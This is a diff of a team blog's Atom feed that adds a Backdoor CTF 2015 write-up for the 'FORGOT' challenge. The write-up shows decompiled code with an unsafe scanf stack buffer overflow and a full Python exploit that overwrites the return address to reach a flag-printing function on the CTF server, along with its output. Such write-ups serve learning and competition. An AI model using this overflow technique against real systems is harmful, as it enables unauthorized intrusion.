@@ -4,7 +4,7 @@
   <title><![CDATA[GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-03T02:34:21+04:30</updated>
+  <updated>2015-04-03T02:59:12+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -12,6 +12,248 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF 2015 - FORGOT Writeup]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/"/>
+    <updated>2015-04-03T02:57:55+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup</id>
+    <content type="html"><![CDATA[<p><strong>Backdoor 2015 FORGOT Writeup</strong><br/>
+<strong>Point = 200</strong><br/>
+<strong>Category = Exploit</strong></p>
+
+<blockquote><p>Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.<br/>
+Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ file forgot
+</span><span class='line'>forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./forgot 
+</span><span class='line'>What is your name?
+</span><span class='line'>&gt; AAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>Hi AAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>                        Finite-State Automaton
+</span><span class='line'>
+</span><span class='line'>I have implemented a robust FSA to validate email addresses
+</span><span class='line'>Throw a string at me and I will let you know if it is a valid email address
+</span><span class='line'>
+</span><span class='line'>                                Cheers!
+</span><span class='line'>
+</span><span class='line'>I should give you a pointer perhaps. Here: 8048654
+</span><span class='line'>
+</span><span class='line'>Enter the string to be validate
+</span><span class='line'>&gt; AAAAAAAAAAAAAAAAAA
+</span><span class='line'>Dude, you seriously think this is going to work. Where are the fancy @ and [dot], huh?</span></code></pre></td></tr></table></div></figure>
+
+
+<p>without loosing time opening the binary into IDA shows us several functions but the General function to this functionality is <code>0x08047AA</code>. lets see the psuedo-code :</p>
+
+<!--more-->
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>...
+</span><span class='line'>  puts("What is your name?");
+</span><span class='line'>  printf("&gt; ");
+</span><span class='line'>  fflush(stdout);
+</span><span class='line'>  fgets((char *)&v19, 32, stdin);
+</span><span class='line'>  sub_80485DD(&v19);
+</span><span class='line'>  fflush(stdout);
+</span><span class='line'>  printf("I should give you a pointer perhaps. Here: %x\n\n", sub_8048654);
+</span><span class='line'>  fflush(stdout);
+</span><span class='line'>  puts("Enter the string to be validate");
+</span><span class='line'>  printf("&gt; ");
+</span><span class='line'>  fflush(stdout);
+</span><span class='line'>  __isoc99_scanf("%s", &v8);
+</span><span class='line'>  for ( i = 0; ; ++i )
+</span><span class='line'> ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is the interesting part since we have control on inputs. <code>v19</code> is a 32 char buffer so no vulnerabilty is there. but what about <code>__isoc99_scanf("%s", &amp;v8);</code> ? obviously using <em>scanf</em> in such a manner is exteremly dangerous. <code>v8</code> also is a 32 char buffer. so it is also another stack buffer overflow like <code>ECHO</code>. lets check this condition :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "GeeksSpeak\n"+"A"*40+"\n"' &gt; forgot.test
+</span><span class='line'>hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ cat forgot.test 
+</span><span class='line'>GeeksSpeak
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ ./forgot &lt; forgot.test 
+</span><span class='line'>What is your name?
+</span><span class='line'>&gt; 
+</span><span class='line'>Hi GeeksSpeak
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>                        Finite-State Automaton
+</span><span class='line'>
+</span><span class='line'>I have implemented a robust FSA to validate email addresses
+</span><span class='line'>Throw a string at me and I will let you know if it is a valid email address
+</span><span class='line'>
+</span><span class='line'>                                Cheers!
+</span><span class='line'>
+</span><span class='line'>I should give you a pointer perhaps. Here: 8048654
+</span><span class='line'>
+</span><span class='line'>Enter the string to be validate
+</span><span class='line'>Segmentation fault (core dumped)
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and <code>gdb</code> proves this too. but how should i read the flag? do we need ROP? or something simillar? i started dumping strings in IDA and located these:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.rodata:08048D9F 00000007 C ./flag
+</span><span class='line'>.rodata:08048DA6 00000007 C cat %s</span></code></pre></td></tr></table></div></figure>
+
+
+<p>these strings had been used in <code>0x080486CC</code> and finding a call system proves that like ECHO we should just using this function as RET.</p>
+
+<p>by using this piece of code we have:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">readuntil</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">delim</span><span class="o">=</span><span class="s">&#39;&gt; &#39;</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">data</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+</span><span class='line'>    <span class="k">while</span> <span class="ow">not</span> <span class="n">data</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
+</span><span class='line'>        <span class="n">c</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
+</span><span class='line'>        <span class="n">data</span> <span class="o">+=</span> <span class="n">c</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">data</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">u</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">v</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;hack.bckdr.in&#39;</span><span class="p">,</span> <span class="mi">8009</span><span class="p">))</span>
+</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">makefile</span><span class="p">(</span><span class="s">&#39;rw&#39;</span><span class="p">,</span> <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">readuntil</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;A</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">readuntil</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x80486CC</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">python</span> <span class="n">sol</span><span class="o">.</span><span class="n">py</span>
+</span><span class='line'><span class="n">ebe2c4abf85c239c7bd0385a685c460b2c5fe1dcdb2236f87dfef826bb690adf</span>
+</span><span class='line'><span class="o">***</span> <span class="n">Connection</span> <span class="n">closed</span> <span class="n">by</span> <span class="n">remote</span> <span class="n">host</span> <span class="o">***</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;ve got the flag. 200pts.</p>
+
+<p>HAMIDx9</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Backdoor CTF 2015 - CONCEALED Writeup]]></title>
